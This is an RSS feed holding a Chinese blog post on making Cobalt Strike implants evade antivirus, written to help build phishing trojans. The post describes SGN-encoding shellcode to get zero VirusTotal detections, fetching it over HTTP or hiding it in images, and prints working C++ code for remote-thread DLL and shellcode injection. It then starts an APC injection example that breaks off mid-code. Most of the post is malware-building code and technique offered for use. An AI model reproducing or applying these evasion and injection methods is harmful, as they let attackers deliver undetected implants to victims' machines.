<?xml version="1.0"?>
<rss version="2.0">
    <channel>
        <title>shutTD</title>
        <subtitle>Cyber AD</subtitle>
        <icon>https://shut-td.github.io/images/favicon.ico</icon>
        <link>https://shut-td.github.io</link>
        <author>
          <name>shutTD</name>
        </author>
        <description>菜只因~</description>
        <language>zh-CN</language>
        <pubDate>Tue, 16 Jul 2024 10:13:27 +0800</pubDate>
        <lastBuildDate>Tue, 16 Jul 2024 10:13:27 +0800</lastBuildDate>
        <category term="ikun~" />
        <category term="UnTivirus" />
        <item>
            <guid isPermalink="true">https://shut-td.github.io/CS%E8%BF%9C%E6%8E%A7%E5%85%8D%E6%9D%80%E6%80%9D%E8%B7%AF%E4%B8%8E%E5%AE%9E%E7%8E%B0/</guid>
            <title>CS远控免杀思路与实现</title>
            <link>https://shut-td.github.io/CS%E8%BF%9C%E6%8E%A7%E5%85%8D%E6%9D%80%E6%80%9D%E8%B7%AF%E4%B8%8E%E5%AE%9E%E7%8E%B0/</link>
            <category term="免杀" scheme="https://shut-td.github.io/categories/%E5%85%8D%E6%9D%80/" />
            <category term="免杀" scheme="https://shut-td.github.io/tags/%E5%85%8D%E6%9D%80/" />
            <pubDate>Tue, 16 Jul 2024 10:13:27 +0800</pubDate>
            <description><![CDATA[ &lt;h3 id=&#34;cs原生shellcode上线免杀&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cs原生shellcode上线免杀&#34;&gt;#&lt;/a&gt; CS 原生 shellcode 上线免杀&lt;/h3&gt;
&lt;p&gt;最近攻防在即所以想要尝试写免杀🐎钓钓鱼，所以小学了一手一些比较好用且免杀效果比较好的手法做一下总结，从几个角度去组合免杀。&lt;/p&gt;
&lt;h5 id=&#34;shellcode免杀&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#shellcode免杀&#34;&gt;#&lt;/a&gt; shellcode 免杀&lt;/h5&gt;
&lt;p&gt;sgn 编码 (内存自解密)，可以很好的做到静态免杀的效果不需要做其他任何加密手段即可做到静态免杀，可以尝试 sgn 编码后传 vt 一般就是 0 查杀。&lt;/p&gt;
&lt;p&gt;用法：将 shellcode 二进制文件例如 xx.bin 保存，使用 sgn.exe 进行编码，需要注意的是系统位数要对&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;原始 shellcode&lt;/strong&gt; (用 winhex 等二进制编辑器打开):&lt;img data-src=&#34;https://dlink.host/wx4.sinaimg.cn/large/008DfUDOly8hrpo6edkdoj30hk0drwk8.jpg&#34; alt=&#34;&#34; /&gt;&lt;br /&gt;
&lt;strong&gt;sgn 进行编码&lt;/strong&gt;:&lt;img data-src=&#34;https://dlink.host/wx1.sinaimg.cn/large/008DfUDOly8hrpo6it3a1j30v10apmyj.jpg&#34; alt=&#34;&#34; /&gt;&lt;br /&gt;
&lt;strong&gt; 编码后的 shellcode&lt;/strong&gt;:&lt;img data-src=&#34;https://dlink.host/wx1.sinaimg.cn/large/008DfUDOly8hrpo6ptt93j30rs0t819n.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;这种静态免杀效果很好基本上无需做其他任何加密处理，同时还做到了降熵，当然这里还可以将二进制文件托管到服务器上然后通过 http 请求来获取 shellcode，也可以配合图片隐写进行 shellcode 的隐藏。&lt;/p&gt;
&lt;h4 id=&#34;代码与进程注入手法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#代码与进程注入手法&#34;&gt;#&lt;/a&gt; 代码与进程注入手法&lt;/h4&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;CreateRemoteThread (远程线程注入)&lt;/strong&gt;&lt;/em&gt;&lt;br /&gt;
 注入流程：&lt;br /&gt;
1、根据进程名寻找 pid，用于后续进程注入&lt;br /&gt;
 2、根据 pid 打开指定进程句柄&lt;br /&gt;
 3、向指定进程申请可读可写可执行的内存区域&lt;br /&gt;
 4、将 shellcode 或 dll 注入到该内存区域中&lt;br /&gt;
 5、开辟一个新线程执行&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight cpp&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;Windows.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;Tlhelp32.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;DWORD &lt;span class=&#34;title&#34;&gt;GetProcessIdByName&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(LPCTSTR lpszProcessName)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    HANDLE hSnapshot = &lt;span class=&#34;built_in&#34;&gt;CreateToolhelp32Snapshot&lt;/span&gt;(TH32CS_SNAPPROCESS, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (hSnapshot == INVALID_HANDLE_VALUE)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    PROCESSENTRY32 pe;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    pe.dwSize = &lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt; pe;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;built_in&#34;&gt;Process32First&lt;/span&gt;(hSnapshot, &amp;amp;pe))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;do&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;built_in&#34;&gt;lstrcmpi&lt;/span&gt;(lpszProcessName, pe.szExeFile) == &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;built_in&#34;&gt;CloseHandle&lt;/span&gt;(hSnapshot);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; pe.th32ProcessID;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125; &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; (&lt;span class=&#34;built_in&#34;&gt;Process32Next&lt;/span&gt;(hSnapshot, &amp;amp;pe));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;CloseHandle&lt;/span&gt;(hSnapshot);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; path[] = &lt;span class=&#34;string&#34;&gt;&amp;quot;C:\\xxx\\TestDll.dll&amp;quot;&lt;/span&gt;;   &lt;span class=&#34;comment&#34;&gt;//dll注入&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; shellcode[] = &amp;#123;\x12&amp;#125;;  &lt;span class=&#34;comment&#34;&gt;//shellcode注入 &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;DllInjectMain&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;comment&#34;&gt;//dll注入&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    HANDLE hProcess = &lt;span class=&#34;built_in&#34;&gt;OpenProcess&lt;/span&gt;(PROCESS_ALL_ACCESS, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;GetProcessIdByName&lt;/span&gt;((LPCTSTR)&lt;span class=&#34;string&#34;&gt;&amp;quot;notepad.exe&amp;quot;&lt;/span&gt;));    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    LPVOID lpBaseAddress = &lt;span class=&#34;built_in&#34;&gt;VirtualAllocEx&lt;/span&gt;(hProcess, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x1000&lt;/span&gt;, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;WriteProcessMemory&lt;/span&gt;(hProcess, lpBaseAddress, path, &lt;span class=&#34;built_in&#34;&gt;sizeof&lt;/span&gt;(path), &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    LPTHREAD_START_ROUTINE pLoadlibrary = (LPTHREAD_START_ROUTINE)&lt;span class=&#34;built_in&#34;&gt;GetProcAddress&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;GetModuleHandleA&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;kernel32.dll&amp;quot;&lt;/span&gt;), &lt;span class=&#34;string&#34;&gt;&amp;quot;LoadLibraryA&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;CreateRemoteThread&lt;/span&gt;(hProcess, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, (LPTHREAD_START_ROUTINE)pLoadlibrary, lpBaseAddress, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;ShellcodeInjectMain&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&amp;#123;   &lt;span class=&#34;comment&#34;&gt;//shellcode注入&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      HANDLE hProcess = &lt;span class=&#34;built_in&#34;&gt;OpenProcess&lt;/span&gt;(PROCESS_ALL_ACCESS, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;GetProcessIdByName&lt;/span&gt;((LPCTSTR)&lt;span class=&#34;string&#34;&gt;&amp;quot;notepad.exe&amp;quot;&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      LPVOID lpBaseAddress = &lt;span class=&#34;built_in&#34;&gt;VirtualAllocEx&lt;/span&gt;(hProcess, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x1000&lt;/span&gt;(或者&lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt; shellcdoe), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;built_in&#34;&gt;WriteProcessMemory&lt;/span&gt;(hProcess, lpBaseAddress, shellcode, &lt;span class=&#34;built_in&#34;&gt;sizeof&lt;/span&gt;(shellcode), &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;built_in&#34;&gt;CreateRemoteThread&lt;/span&gt;(hProcess, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, (LPTHREAD_START_ROUTINE)lpBaseAddress, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
 这种直接的线程注入容易暴毙，建议搭配其他手段食用。&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;APC Injection (APC 注入)&lt;/strong&gt;&lt;/em&gt;&lt;br /&gt;
 每个线程都有自己的 APC 队列，应用程序通过调用&lt;strong&gt; QueueUserAPC&lt;/strong&gt; 函数将 APC 排队到线程中，调用线程在对&lt;strong&gt; QueueUserAPC&lt;/strong&gt; 的调用中指定 APC 函数的地址，当 APC 排队到线程中时，系统会发出软件中断。下次调度线程时，它将运行 APC 功能。&lt;br /&gt;
注入流程：&lt;br /&gt;
1、根据进程名确定 pid&lt;br /&gt;
2、通过 pid 遍历 tid&lt;br /&gt;
3、插入 APC 队列&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight cpp&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;lt;Windows.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;Tlhelp32.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;DWORD &lt;span class=&#34;title&#34;&gt;GetProcessIdByName&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(LPCTSTR lpszProcessName)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    HANDLE hSnapshot = &lt;span class=&#34;built_in&#34;&gt;CreateToolhelp32Snapshot&lt;/span&gt;(TH32CS_SNAPPROCESS, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (hSnapshot == INVALID_HANDLE_VALUE)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    PROCESSENTRY32 pe;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    pe.dwSize = &lt;span 